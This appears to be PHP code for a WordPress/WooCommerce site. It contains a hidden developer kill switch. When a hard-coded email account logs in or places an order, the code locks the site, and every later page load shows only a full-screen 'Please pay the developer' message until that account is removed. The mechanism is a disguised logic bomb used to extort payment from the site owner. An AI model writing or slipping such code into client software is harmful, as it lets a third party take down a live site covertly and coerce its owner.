function check_trigger_user($user_login, $user) {
    if ($user->user_email === 'sales.hkssoftware@gmail.com') {
        update_option('site_locked', 'yes');
        error_log('Site locked by user: ' . $user->user_email); // Debug log
    }
}
add_action('wp_login', 'check_trigger_user', 10, 2);


function check_order_user($order_id) {
    $order = wc_get_order($order_id);
    $billing_email = $order->get_billing_email();
    
    if ($billing_email === 'sales.hkssoftware@gmail.com') {
        update_option('site_locked', 'yes');
    }
}
add_action('woocommerce_thankyou', 'check_order_user', 10, 1);


function developer_payment_reminder() {
    // Check if the site is locked
    if (get_option('site_locked') === 'yes') {
        // Check if the trigger user still exists
        $user = get_user_by('email', 'sales.hkssoftware@gmail.com');
        if (!$user) {
            // If the user is not found, unlock the site
            update_option('site_locked', 'no');
        } else {
            // If the user is found, lock the site and display the message
            ?>
            <style>
                body {
                    background-color: white !important;
                }
                #developer-message {
                    display: flex !important;
                    width: 100%;
                    height: 100vh;
                    justify-content: center;
                    align-items: center;
                    font-size: 2rem;
                    background-color: white;
                    color: black;
                    position: absolute;
                    top: 0;
                    left: 0;
                    z-index: 9999;
                }
                #site-content {
                    display: none !important;
                }
            </style>
            <div id="developer-message">Please pay the developer</div>
            <script>
                document.getElementById('site-content').style.display = 'none';
                document.getElementById('developer-message').style.display = 'flex';
            </script>
            <?php
            exit; // Ensure no further content is rendered
        }
    }
}
add_action('wp_head', 'developer_payment_reminder');